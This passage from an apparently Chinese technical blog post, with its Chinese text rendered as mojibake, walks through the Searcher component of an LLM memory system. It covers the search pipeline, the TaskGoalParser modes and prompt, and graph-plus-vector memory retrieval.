<li>ä½¿ç”¨ TaskGoalParser è§£æç”¨æˆ·æŸ¥è¯¢æ„å›¾</li>
<li>æ ¹æ®ä¸åŒæ¨¡å¼ï¼ˆfast/fineï¼‰é‡‡ç”¨ä¸åŒçš„æ£€ç´¢ç­–ç•¥</li>
<li>åœ¨ç²¾ç»†æ¨¡å¼ä¸‹å…ˆè¿›è¡ŒåµŒå…¥æœç´¢è·å–ä¸Šä¸‹æ–‡</li>
</ul>
</li>
<li>
<p>ç»“æœé‡æ’åºä¸å»é‡</p>
<ul>
<li>ä½¿ç”¨ reranker å¯¹æ£€ç´¢ç»“æœè¿›è¡Œé‡æ–°æ’åº</li>
<li>å»é™¤é‡å¤çš„è®°å¿†é¡¹</li>
<li>ä¿ç•™æœ€ç›¸å…³çš„ç»“æœ</li>
</ul>
</li>
<li>
<p>é«˜çº§æ¨ç†å¤„ç†</p>
<ul>
<li>åˆ©ç”¨ MemoryReasoner å¯¹æ£€ç´¢åˆ°çš„è®°å¿†è¿›è¡Œæ¨ç†å’ŒçŸ¥è¯†ç»¼åˆ</li>
<li>æå–æœ€æœ‰ä»·å€¼çš„ä¿¡æ¯ç‰‡æ®µ</li>
</ul>
</li>
<li>
<p>ä½¿ç”¨å†å²è¿½è¸ª</p>
<ul>
<li>æ›´æ–°è®°å¿†é¡¹çš„ä½¿ç”¨å†å²è®°å½•</li>
<li>å¹¶å‘å¤„ç†ä½¿ç”¨ç»Ÿè®¡æ›´æ–°</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">2.1 å®šä¹‰</h4>
<pre><code class="hljs language-ini" lang="ini">class Searcher:
 Â  Â def __init__(
 Â  Â  Â  Â self,
 Â  Â  Â  Â dispatcher_llm: OpenAILLM | OllamaLLM | AzureLLM,
 Â  Â  Â  Â graph_store: Neo4jGraphDB,
 Â  Â  Â  Â embedder: OllamaEmbedder,
 Â  Â  Â  Â reranker: BaseReranker,
 Â  Â  Â  Â internet_retriever: InternetRetrieverFactory | <span class="hljs-attr">None</span> = None,
 Â  Â  Â  Â moscube: <span class="hljs-attr">bool</span> = <span class="hljs-literal">False</span>,
 Â   ):
 Â  Â  Â  Â <span class="hljs-attr">self.graph_store</span> = graph_store
 Â  Â  Â  Â <span class="hljs-attr">self.embedder</span> = embedder
â€‹
 Â  Â  Â  Â <span class="hljs-attr">self.task_goal_parser</span> = TaskGoalParser(dispatcher_llm)
 Â  Â  Â  Â <span class="hljs-attr">self.graph_retriever</span> = GraphMemoryRetriever(self.graph_store, self.embedder)
 Â  Â  Â  Â <span class="hljs-attr">self.reranker</span> = reranker
 Â  Â  Â  Â <span class="hljs-attr">self.reasoner</span> = MemoryReasoner(dispatcher_llm)
â€‹
 Â  Â  Â  Â <span class="hljs-comment"># Create internet retriever from config if provided</span>
 Â  Â  Â  Â <span class="hljs-attr">self.internet_retriever</span> = internet_retriever
 Â  Â  Â  Â <span class="hljs-attr">self.moscube</span> = moscube
â€‹
 Â  Â  Â  Â <span class="hljs-attr">self._usage_executor</span> = ContextThreadPoolExecutor(max_workers=<span class="hljs-number">4</span>, thread_name_prefix=<span class="hljs-string">"usage"</span>)
</code></pre>
<h4 data-id="heading-5">2.2 æ ¸å¿ƒå‡½æ•°</h4>
<p>å…¶æ ¸å¿ƒæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<ul>
<li>search()ï¼šä¸»å…¥å£ï¼Œåè°ƒæ•´ä¸ªæ£€ç´¢è¿‡ç¨‹</li>
<li>_parse_task()ï¼šè§£æä»»åŠ¡å’ŒæŸ¥è¯¢</li>
<li>_retrieve_paths()ï¼šæ‰§è¡Œå¤šè·¯å¾„æ£€ç´¢</li>
<li>_deduplicate_results()ï¼šç»“æœå»é‡</li>
<li>_sort_and_trim()ï¼šæ’åºå’Œæˆªæ–­ç»“æœ</li>
<li>update_usage_history()ï¼šæ›´æ–°ä½¿ç”¨å†å²</li>
</ul>
<p>ä¸»å…¥å£å¦‚ä¸‹ï¼Œæˆ–è€…è¯´Searcher ç¼–æ’æœç´¢æµæ°´çº¿å¦‚ä¸‹ï¼š</p>
<ul>
<li>æŸ¥è¯¢è§£æå’Œç†è§£</li>
<li>ä»å¤šä¸ªæ¥æºå¹¶è¡Œæ£€ç´¢</li>
<li>ç»“æœé‡æ–°æ’åº</li>
<li>å»é‡å¤„ç†</li>
<li>å¯¹ç»“æœè¿›è¡Œæ¨ç†</li>
<li>ä½¿ç”¨æƒ…å†µè·Ÿè¸ª</li>
</ul>

<pre><code class="hljs language-python" lang="python"> Â  Â @timed
 Â  Â <span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">
 Â  Â  Â  Â self,
 Â  Â  Â  Â query: <span class="hljs-built_in">str</span>,
 Â  Â  Â  Â top_k: <span class="hljs-built_in">int</span>,
 Â  Â  Â  Â info=<span class="hljs-literal">None</span>,
 Â  Â  Â  Â mode=<span class="hljs-string">"fast"</span>,
 Â  Â  Â  Â memory_type=<span class="hljs-string">"All"</span>,
 Â  Â  Â  Â search_filter: <span class="hljs-built_in">dict</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,
 Â   </span>) -&gt; <span class="hljs-built_in">list</span>[TextualMemoryItem]:
 Â  Â  Â  Â <span class="hljs-string">"""
 Â  Â  Â   Search for memories based on a query.
 Â  Â  Â   User query -&gt; TaskGoalParser -&gt; GraphMemoryRetriever -&gt;
 Â  Â  Â   MemoryReranker -&gt; MemoryReasoner -&gt; Final output
 Â  Â  Â   Args:
 Â  Â  Â  Â  Â   query (str): The query to search for.
 Â  Â  Â  Â  Â   top_k (int): The number of top results to return.
 Â  Â  Â  Â  Â   info (dict): Leave a record of memory consumption.
 Â  Â  Â  Â  Â   mode (str, optional): The mode of the search.
 Â  Â  Â  Â  Â   - 'fast': Uses a faster search process, sacrificing some precision for speed.
 Â  Â  Â  Â  Â   - 'fine': Uses a more detailed search process, invoking large models for higher precision, but slower performance.
 Â  Â  Â  Â  Â   memory_type (str): Type restriction for search.
 Â  Â  Â  Â  Â   ['All', 'WorkingMemory', 'LongTermMemory', 'UserMemory']
 Â  Â  Â  Â  Â   search_filter (dict, optional): Optional metadata filters for search results.
 Â  Â  Â   Returns:
 Â  Â  Â  Â  Â   list[TextualMemoryItem]: List of matching memories.
 Â  Â  Â   """</span>
 Â  Â  Â  Â logger.info(
 Â  Â  Â  Â  Â  Â <span class="hljs-string">f"[SEARCH] Start query='<span class="hljs-subst">{query}</span>', top_k=<span class="hljs-subst">{top_k}</span>, mode=<span class="hljs-subst">{mode}</span>, memory_type=<span class="hljs-subst">{memory_type}</span>"</span>
 Â  Â  Â   )
 Â  Â  Â  Â <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info:
 Â  Â  Â  Â  Â  Â logger.warning(
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-string">"Please input 'info' when use tree.search so that "</span>
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-string">"the database would store the consume history."</span>
 Â  Â  Â  Â  Â   )
 Â  Â  Â  Â  Â  Â info = {<span class="hljs-string">"user_id"</span>: <span class="hljs-string">""</span>, <span class="hljs-string">"session_id"</span>: <span class="hljs-string">""</span>}
 Â  Â  Â  Â <span class="hljs-keyword">else</span>:
 Â  Â  Â  Â  Â  Â logger.debug(<span class="hljs-string">f"[SEARCH] Received info dict: <span class="hljs-subst">{info}</span>"</span>)
â€‹
 Â  Â  Â  Â parsed_goal, query_embedding, context, query = self._parse_task(
 Â  Â  Â  Â  Â  Â query, info, mode, search_filter=search_filter
 Â  Â  Â   )
 Â  Â  Â  Â results = self._retrieve_paths(
 Â  Â  Â  Â  Â  Â query, parsed_goal, query_embedding, info, top_k, mode, memory_type, search_filter
 Â  Â  Â   )
 Â  Â  Â  Â deduped = self._deduplicate_results(results)
 Â  Â  Â  Â final_results = self._sort_and_trim(deduped, top_k)
 Â  Â  Â  Â self._update_usage_history(final_results, info)
â€‹
 Â  Â  Â  Â logger.info(<span class="hljs-string">f"[SEARCH] Done. Total <span class="hljs-subst">{<span class="hljs-built_in">len</span>(final_results)}</span> results."</span>)
 Â  Â  Â  Â res_results = <span class="hljs-string">""</span>
 Â  Â  Â  Â <span class="hljs-keyword">for</span> _num_i, result <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(final_results):
 Â  Â  Â  Â  Â  Â res_results += <span class="hljs-string">"\n"</span> + (
 Â  Â  Â  Â  Â  Â  Â  Â result.<span class="hljs-built_in">id</span> + <span class="hljs-string">"|"</span> + result.metadata.memory_type + <span class="hljs-string">"|"</span> + result.memory
 Â  Â  Â  Â  Â   )
 Â  Â  Â  Â logger.info(<span class="hljs-string">f"[SEARCH] Results. <span class="hljs-subst">{res_results}</span>"</span>)
 Â  Â  Â  Â <span class="hljs-keyword">return</span> final_results
</code></pre>
<h4 data-id="heading-6">2.3 ä¾èµ–å…³ç³»å’Œå…³è”å…³ç³»</h4>
<h5 data-id="heading-7">2.3.1 ä¾èµ–é¡¹ï¼ˆSearcher ä¾èµ–çš„ç»„ä»¶ï¼‰</h5>
<p>Searcher ä¾èµ–çš„ç»„ä»¶å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>å¤§è¯­è¨€æ¨¡å‹ç»„ä»¶ï¼š</p>
<ul>
<li>dispatcher_llm â€“ ç”¨äºä»»åŠ¡è§£æå’Œæ¨ç†</li>
<li>TaskGoalParser â€“ å°†ç”¨æˆ·æŸ¥è¯¢è§£æä¸ºç»“æ„åŒ–ç›®æ ‡</li>
</ul>
</li>
<li>
<p>å­˜å‚¨ç»„ä»¶ï¼š</p>
<ul>
<li>graph_store â€“ Neo4j å›¾æ•°æ®åº“ç”¨äºå­˜å‚¨è®°å¿†</li>
<li>GraphMemoryRetriever â€“ ä»å›¾å­˜å‚¨ä¸­æ£€ç´¢è®°å¿†</li>
</ul>
</li>
<li>
<p>å¤„ç†ç»„ä»¶ï¼š</p>
<ul>
<li>embedder â€“ ä¸ºæŸ¥è¯¢å’Œè®°å¿†åˆ›å»ºåµŒå…¥å‘é‡</li>
<li>reranker â€“ å¯¹æ£€ç´¢ç»“æœè¿›è¡Œé‡æ–°æ’åº</li>
<li>MemoryReasoner â€“ å¯¹æ£€ç´¢åˆ°çš„è®°å¿†è¿›è¡Œæ¨ç†</li>
<li>internet_retriever â€“ å¯é€‰çš„äº’è”ç½‘æœç´¢åŠŸèƒ½</li>
</ul>
</li>
</ul>
<h5 data-id="heading-8">2.3.2 ä¾èµ– Searcher çš„ç»„ä»¶</h5>
<p>ä¾èµ– Searcher çš„ç»„ä»¶å¦‚ä¸‹ï¼š</p>
<ul>
<li>TreeTextMemory â€“ åœ¨å…¶ search æ–¹æ³•ä¸­ä½¿ç”¨ Searcher</li>
<li>GeneralScheduler â€“ é€šè¿‡æ£€ç´¢å™¨åœ¨ process_session_turn ä¸­ä½¿ç”¨ Searcher</li>
</ul>
<h4 data-id="heading-9">2.4 å›¾ä¾‹</h4>
<p>Searcher è¢«è°ƒåº¦å™¨ç³»ç»Ÿç”¨äºåœ¨æŸ¥è¯¢å¤„ç†è¿‡ç¨‹ä¸­æ£€ç´¢ç›¸å…³è®°å¿†ï¼Œæ€»çš„æ¥è¯´ï¼ŒSearcher å……å½“ä¸€ä¸ªä¸­å¤®åè°ƒè€…ï¼Œå°†å„ç§ç»„ä»¶æ•´åˆåœ¨ä¸€èµ·ï¼Œä¸ºè·¨ä¸åŒè®°å¿†æºå’Œå¤–éƒ¨æ•°æ®æä¾›å…¨é¢çš„æ£€ç´¢èƒ½åŠ›ã€‚</p>
<h5 data-id="heading-10">2.4.1 Searcher ç»„ä»¶å…³ç³»æµç¨‹å›¾</h5>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4d979d43803436495c2d5112601d62b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801901&amp;x-signature=ASPi6KA1T8DHkJmZVPlKSM71oLY%3D" alt="Searcher ç»„ä»¶å…³ç³»æµç¨‹å›¾" loading="lazy"/></p>
<h5 data-id="heading-11">2.4.2 Searcher è¯¦ç»†æœç´¢è¿‡ç¨‹æµç¨‹</h5>
<p>ç”¨æˆ·æŸ¥è¯¢ â†’ TaskGoalParser è§£æ â†’ å¤šè·¯å¾„å¹¶è¡Œæ£€ç´¢ â†’ ç»“æœé‡æ’åº â†’ å»é‡å¤„ç† â†’ æ¨ç†ä¼˜åŒ– â†’ è¿”å›æœ€ç»ˆç»“æœã€‚</p>
<p>å„ç»„ä»¶è¯¦ç»†è¯´æ˜</p>
<p><strong>ä¸»è¦é˜¶æ®µ</strong></p>
<ul>
<li>ä»»åŠ¡è§£æï¼šä½¿ç”¨ TaskGoalParser è§£ææŸ¥è¯¢ï¼Œæ ¹æ®æ¨¡å¼å†³å®šæ˜¯å¦ä½¿ç”¨ LLM</li>
<li>å¹¶è¡Œæ£€ç´¢ï¼šåŒæ—¶æ‰§è¡Œå¤šä¸ªæ£€ç´¢è·¯å¾„</li>
<li>ç»“æœé‡æ’ï¼šä½¿ç”¨ Reranker å¯¹å„è·¯å¾„çš„ç»“æœè¿›è¡Œé‡æ’</li>
<li>åˆå¹¶å»é‡ï¼šåˆå¹¶æ‰€æœ‰è·¯å¾„çš„ç»“æœå¹¶å»é™¤é‡å¤é¡¹</li>
<li>æ’åºæˆªå–ï¼šæŒ‰åˆ†æ•°æ’åºå¹¶æˆªå–å‰ K ä¸ªç»“æœ</li>
<li>æ›´æ–°è®°å½•ï¼šæ›´æ–°ä½¿ç”¨å†å²è®°å½•</li>
</ul>
<p><strong>å¹¶è¡Œæ£€ç´¢è·¯å¾„</strong></p>
<ul>
<li>è·¯å¾„ Aï¼šå·¥ä½œå†…å­˜æ£€ç´¢ (WorkingMemory)</li>
<li>è·¯å¾„ Bï¼šé•¿æœŸå’Œç”¨æˆ·å†…å­˜æ£€ç´¢ (LongTermMemory, UserMemory)</li>
<li>è·¯å¾„ Cï¼šäº’è”ç½‘æ£€ç´¢ï¼ˆå¯é€‰ï¼‰</li>
<li>è·¯å¾„ Dï¼šMemCubes æ£€ç´¢ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<p><strong>æ•°æ®æµå‘</strong>ï¼šè¾“å…¥æŸ¥è¯¢ç»è¿‡è§£æåï¼Œè¢«åˆ†å‘åˆ°å¤šä¸ªæ£€ç´¢è·¯å¾„å¹¶è¡Œå¤„ç†ï¼Œæ¯ä¸ªè·¯å¾„éƒ½ä¼šäº§ç”Ÿä¸€æ‰¹å€™é€‰ç»“æœã€‚è¿™äº›ç»“æœç»è¿‡é‡æ’ã€åˆå¹¶ï¼Œæœ€åç»è¿‡å»é‡ã€æ’åºå’Œæˆªå–å¾—åˆ°æœ€ç»ˆç»“æœã€‚æ•´ä¸ªè¿‡ç¨‹ä¸­è¿˜ä¼šæ›´æ–°ä½¿ç”¨å†å²è®°å½•ä»¥ä¾¿åç»­ä¼˜åŒ–ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01aba941f206483ebb9f8f10fe53633e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801901&amp;x-signature=rNFzz9A6wN2jeY0MUyhnQVm5i%2Fg%3D" alt="Searcher è¯¦ç»†æœç´¢è¿‡ç¨‹æµç¨‹" loading="lazy"/></p>
<p>ç”¨æˆ·æœç´¢æµç¨‹å¦‚ä¸‹ï¼šç”¨æˆ·æŸ¥è¯¢ â†’ TaskGoalParser è§£æ â†’ å¤šè·¯å¾„å¹¶è¡Œæ£€ç´¢ â†’ ç»“æœé‡æ’åº â†’ å»é‡å¤„ç† â†’ æ¨ç†ä¼˜åŒ– â†’ è¿”å›æœ€ç»ˆç»“æœã€‚</p>
<p>å…¶ä¸­æ¶‰åŠåˆ°å¦‚ä¸‹ç»„ä»¶ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f081aae6b54641a4b2bfad88d3a3de0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801901&amp;x-signature=DgjU47dG3RRzhr9mIOuKkwe15Nc%3D" alt="æœç´¢æµç¨‹" loading="lazy"/></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬æŒ‰ç…§å¦‚ä¸‹æµç¨‹è¿›è¡Œåˆ†æã€‚</p>
<h4 data-id="heading-12">2.5 TaskGoalParser</h4>
<p>_parse_task æ–¹æ³•ä¸»è¦æ˜¯ä½¿ç”¨ TaskGoalParser æ¥åˆ†æqueryã€‚</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â  Â  Â <span class="hljs-attr">parsed_goal</span> = self.task_goal_parser.parse(
 Â  Â  Â  Â  Â  Â <span class="hljs-attr">task_description</span>=query,
 Â  Â  Â  Â  Â  Â <span class="hljs-attr">context</span>=<span class="hljs-string">"\n"</span>.join(context),
 Â  Â  Â  Â  Â  Â <span class="hljs-attr">conversation</span>=info.get(<span class="hljs-string">"chat_history"</span>, []),
 Â  Â  Â  Â  Â  Â <span class="hljs-attr">mode</span>=mode,
 Â  Â  Â   )
</code></pre>
<p>TaskGoalParser æ˜¯ä¸€ä¸ªä»»åŠ¡ç›®æ ‡è§£æå™¨ï¼Œè´Ÿè´£å°†ç”¨æˆ·çš„è‡ªç„¶è¯­è¨€æŸ¥è¯¢è§£æä¸ºç»“æ„åŒ–çš„è¯­ä¹‰å±‚è¡¨ç¤ºï¼Œä»¥ä¾¿åç»­çš„æ£€ç´¢ç³»ç»Ÿèƒ½å¤Ÿæ›´æœ‰æ•ˆåœ°ç†è§£å’Œå¤„ç†æŸ¥è¯¢ã€‚</p>
<h5 data-id="heading-13">2.5.1 ä¸»è¦åŠŸèƒ½</h5>
<p>TaskGoalParser ä¸»è¦åŠŸèƒ½ä¸ºï¼š</p>
<ul>
<li>
<p>æŸ¥è¯¢è§£æã€‚</p>
<ul>
<li>å°†ç”¨æˆ·è¾“å…¥çš„è‡ªç„¶è¯­è¨€æŸ¥è¯¢è½¬æ¢ä¸ºç»“æ„åŒ–çš„æŸ¥è¯¢è¡¨ç¤º</li>
<li>æä¾›ä¸¤ç§è§£ææ¨¡å¼ï¼šå¿«é€Ÿæ¨¡å¼ï¼ˆfastï¼‰å’Œç²¾ç»†æ¨¡å¼ï¼ˆfineï¼‰</li>
</ul>
</li>
<li>
<p>ç»“æ„åŒ–è¯­ä¹‰è¡¨ç¤º</p>
<ul>
<li>å°†æŸ¥è¯¢åˆ†è§£ä¸ºå¤šä¸ªè¯­ä¹‰å±‚æ¬¡ï¼šä¸»é¢˜ï¼ˆtopicï¼‰ã€å…³é”®è¯ï¼ˆkeysï¼‰ã€æ ‡ç­¾ï¼ˆtagsï¼‰ç­‰ æå–æŸ¥è¯¢çš„æ ¸å¿ƒæ„å›¾å’Œç›¸å…³ä¿¡æ¯</li>
</ul>
</li>
</ul>
<h5 data-id="heading-14">2.5.2 å·¥ä½œæ¨¡å¼</h5>
<h6 data-id="heading-15">Fast æ¨¡å¼</h6>
<pre><code class="hljs language-ini" lang="ini">def _parse_fast(self, task_description: str, limit_num: <span class="hljs-attr">int</span> = <span class="hljs-number">5</span>) -&gt; ParsedTaskGoal:
 Â  Â <span class="hljs-comment"># å¿«é€Ÿæ¨¡å¼ï¼šç®€å•çš„åˆ†è¯å¤„ç†</span>
 Â  Â return ParsedTaskGoal(
 Â  Â  Â  Â <span class="hljs-attr">memories</span>=[task_description],
 Â  Â  Â  Â <span class="hljs-attr">keys</span>=[task_description],
 Â  Â  Â  Â <span class="hljs-attr">tags</span>=[],
 Â  Â  Â  Â <span class="hljs-attr">goal_type</span>=<span class="hljs-string">"default"</span>,
 Â  Â  Â  Â <span class="hljs-attr">rephrased_query</span>=task_description,
 Â  Â  Â  Â <span class="hljs-attr">internet_search</span>=<span class="hljs-literal">False</span>,
</code></pre>
<h6 data-id="heading-16">Fine æ¨¡å¼</h6>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_parse_fine</span>(<span class="hljs-params">
 Â  Â self, query: <span class="hljs-built_in">str</span>, context: <span class="hljs-built_in">str</span> = <span class="hljs-string">""</span>, conversation: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>] | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>
</span>) -&gt; ParsedTaskGoal:
 Â  Â <span class="hljs-comment"># ç²¾ç»†æ¨¡å¼ï¼šä½¿ç”¨ LLM è¿›è¡Œç»“æ„åŒ–è§£æ</span>
 Â  Â <span class="hljs-comment"># æ„å»ºæç¤ºè¯å¹¶è°ƒç”¨ LLM è¿›è¡Œè§£æ</span>
 Â  Â prompt = Template(TASK_PARSE_PROMPT).substitute(
 Â  Â  Â  Â task=query.strip(), context=context, conversation=conversation_prompt
 Â   )
 Â  Â response = self.llm.generate(messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}])
 Â  Â <span class="hljs-keyword">return</span> self._parse_response(response)
</code></pre>
<h5 data-id="heading-17">2.5.3 è¾“å‡ºç»“æ„</h5>
<p>TaskGoalParser è§£æåçš„ç»“æœå­˜å‚¨åœ¨ ParsedTaskGoal å¯¹è±¡ä¸­ï¼ŒåŒ…å«ä»¥ä¸‹å­—æ®µï¼š</p>
<ul>
<li>memoriesï¼šç›¸å…³è®°å¿†é¡¹åˆ—è¡¨</li>
<li>keysï¼šå…³é”®è¯åˆ—è¡¨</li>
<li>tagsï¼šæ ‡ç­¾åˆ—è¡¨</li>
<li>rephrased_queryï¼šé‡è¿°çš„æŸ¥è¯¢ï¼ˆæ›´æ¸…æ™°çš„è¡¨è¾¾ï¼‰</li>
<li>internet_searchï¼šæ˜¯å¦éœ€è¦è”ç½‘æœç´¢</li>
<li>goal_typeï¼šç›®æ ‡ç±»å‹</li>
</ul>
<h5 data-id="heading-18">2.5.4 prompt</h5>
<pre><code class="hljs language-python" lang="python">TASK_PARSE_PROMPT = <span class="hljs-string">"""
You are a task parsing expert. Given a user task instruction, optional former conversation and optional related memory context,extract the following structured information:
1. Keys: the high-level keywords directly relevant to the userâ€™s task.
2. Tags: thematic tags to help categorize and retrieve related memories.
3. Goal Type: retrieval | qa | generation
4. Rephrased instruction: Give a rephrased task instruction based on the former conversation to make it less confusing to look alone. If you think the task instruction is easy enough to understand, or there is no former conversation, set "rephrased_instruction" to an empty string.
5. Need for internet search: If the user's task instruction only involves objective facts or can be completed without introducing external knowledge, set "internet_search" to False. Otherwise, set it to True.
6. Memories: Provide 2â€“5 short semantic expansions or rephrasings of the rephrased/original user task instruction. These are used for improved embedding search coverage. Each should be clear, concise, and meaningful for retrieval.
â€‹
Former conversation (if any):
"""</span>
$conversation
<span class="hljs-string">"""
â€‹
Task description(User Question):
"""</span>$task<span class="hljs-string">"""
â€‹
Context (if any):
"""</span>$context<span class="hljs-string">"""
â€‹
Return strictly in this JSON format, note that the
keys/tags/rephrased_instruction/memories should use the same language as the
input query:
{
  "keys": [...],
  "tags": [...],
  "goal_type": "retrieval | qa | generation",
  "rephrased_instruction": "...", # return an empty string if the original instruction is easy enough to understand
  "internet_search": True/False,
  "memories": ["...", "...", ...]
}
"""</span>
</code></pre>
<h5 data-id="heading-19">2.5.5 ä¼˜åŠ¿</h5>
<p>æ€»çš„æ¥è¯´ï¼ŒTaskGoalParser åœ¨è®°å¿†æ£€ç´¢ç³»ç»Ÿä¸­æ‰®æ¼”ç€â€œæŸ¥è¯¢ç†è§£å™¨â€çš„è§’è‰²ï¼Œé€šè¿‡è§£æç”¨æˆ·æŸ¥è¯¢ä¸ºç»“æ„åŒ–è¡¨ç¤ºï¼Œä¸ºåç»­çš„æ£€ç´¢å’Œæ¨ç†è¿‡ç¨‹æä¾›æ›´ç²¾ç¡®çš„è¾“å…¥ã€‚å…¶ä¼˜åŠ¿ä¸ºï¼š</p>
<ul>
<li>çµæ´»æ€§ï¼šæ”¯æŒä¸¤ç§è§£ææ¨¡å¼ï¼Œé€‚åº”ä¸åŒæ€§èƒ½å’Œç²¾åº¦éœ€æ±‚</li>
<li>ç»“æ„åŒ–ï¼šå°†è‡ªç„¶è¯­è¨€æŸ¥è¯¢è½¬æ¢ä¸ºç»“æ„åŒ–è¡¨ç¤ºï¼Œä¾¿äºåç»­å¤„ç†</li>
<li>ä¸Šä¸‹æ–‡æ„ŸçŸ¥ï¼šåœ¨ç²¾ç»†æ¨¡å¼ä¸‹å¯ä»¥è€ƒè™‘ä¸Šä¸‹æ–‡å’Œå¯¹è¯å†å²</li>
<li>é”™è¯¯å¤„ç†ï¼šå½“ç²¾ç»†æ¨¡å¼å¤±è´¥æ—¶ä¼šå›é€€åˆ°å¿«é€Ÿæ¨¡å¼</li>
</ul>
<h4 data-id="heading-20">2.6 GraphMemoryRetriever</h4>
<p>GraphMemoryRetriever æ˜¯ä¸€ä¸ªç»Ÿä¸€çš„è®°å¿†æ£€ç´¢å™¨ï¼Œç»“åˆäº†å›¾ç»“æ„æ£€ç´¢å’Œå‘é‡ç›¸ä¼¼æ€§æ£€ç´¢ä¸¤ç§æ–¹å¼ï¼Œç”¨äºä»çŸ¥è¯†å›¾è°±ä¸­æ£€ç´¢ç›¸å…³è®°å¿†é¡¹ã€‚</p>
<h5 data-id="heading-21">2.6.1 ä¸»è¦åŠŸèƒ½</h5>
<p>GraphMemoryRetriever å®ç°æ··åˆæ£€ç´¢ï¼Œè¿™ç§è®¾è®¡ä½¿å¾—ç³»ç»Ÿæ—¢èƒ½åˆ©ç”¨ç»“æ„åŒ–ä¿¡æ¯è¿›è¡Œç²¾ç¡®æ£€ç´¢ï¼Œåˆèƒ½é€šè¿‡å‘é‡ç›¸ä¼¼æ€§æ•è·è¯­ä¹‰ç›¸å…³çš„å†…å®¹ï¼Œä»è€Œæé«˜äº†æ£€ç´¢çš„å‡†ç¡®æ€§å’Œå¬å›ç‡ã€‚</p>
<ul>
<li>
<p>æ··åˆæ£€ç´¢æœºåˆ¶</p>
<ul>
<li>ç»“æ„åŒ–å›¾æ£€ç´¢ï¼šåŸºäºè§£æåçš„ä»»åŠ¡ç›®æ ‡ï¼ˆkeys/tagsï¼‰è¿›è¡Œç²¾ç¡®åŒ¹é…</li>
<li>å‘é‡ç›¸ä¼¼æ€§æ£€ç´¢ï¼šåŸºäºæŸ¥è¯¢åµŒå…¥è¿›è¡Œè¯­ä¹‰ç›¸ä¼¼åº¦æœç´¢</li>
<li>åˆå¹¶ä¸¤ç§æ£€ç´¢ç»“æœå¹¶å»é‡</li>
</ul>
</li>
<li>
<p>å¤šèŒƒå›´è®°å¿†æ£€ç´¢</p>
<ul>
<li>æ”¯æŒä¸åŒç±»å‹çš„è®°å¿†èŒƒå›´ï¼šWorkingMemoryã€LongTermMemoryã€UserMemory</li>
<li>é’ˆå¯¹ä¸åŒèŒƒå›´é‡‡ç”¨ä¸åŒçš„æ£€ç´¢ç­–ç•¥</li>
</ul>
</li>
</ul>
<h5 data-id="heading-22">2.6.2 æ ¸å¿ƒæ–¹æ³•</h5>
<ul>
<li>
<p>retrieve æ–¹æ³•ï¼šè¿™æ˜¯ä¸»è¦çš„æ£€ç´¢å…¥å£ï¼Œæ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>å¯¹äº WorkingMemoryï¼Œç›´æ¥è·å–æ‰€æœ‰æ¡ç›®ï¼›</li>
<li>å¯¹äºå…¶ä»–è®°å¿†ç±»å‹ï¼ŒåŒæ—¶æ‰§è¡Œ _graph_recall å’Œ _vector_recallï¼›</li>
<li>åˆå¹¶ç»“æœå¹¶å»é™¤é‡å¤é¡¹ã€‚</li>
</ul>
</li>
<li>
<p>_graph_recall æ–¹æ³•ï¼šæ‰§è¡ŒåŸºäºå›¾ç»“æ„çš„æ£€ç´¢ï¼š</p>
<ul>
<li>åŸºäº keys è¿›è¡Œç²¾ç¡®åŒ¹é…æ£€ç´¢ï¼›</li>
<li>åŸºäº tags è¿›è¡ŒåŒ…å«åŒ¹é…æ£€ç´¢ï¼›</li>
<li>å¯¹å€™é€‰ç»“æœè¿›è¡Œåè¿‡æ»¤ï¼Œç¡®ä¿è‡³å°‘æœ‰ 2 ä¸ªæ ‡ç­¾é‡å ã€‚</li>
</ul>
</li>
<li>
<p>_vector_recall æ–¹æ³•ï¼šæ‰§è¡ŒåŸºäºå‘é‡çš„ç›¸ä¼¼æ€§æ£€ç´¢ï¼š</p>
<ul>
<li>ä½¿ç”¨æŸ¥è¯¢åµŒå…¥åœ¨å›¾æ•°æ®åº“ä¸­æœç´¢æœ€ç›¸ä¼¼çš„è®°å¿†é¡¹ï¼›</li>
<li>æ”¯æŒå¸¦è¿‡æ»¤æ¡ä»¶çš„æœç´¢å’Œä¸å¸¦è¿‡æ»¤æ¡ä»¶çš„æœç´¢è·¯å¾„ï¼›</li>
<li>å¹¶å‘æ‰§è¡Œå¤šä¸ªæœç´¢ä»»åŠ¡ä»¥æé«˜æ•ˆç‡ã€‚</li>
</ul>
</li>
<li>
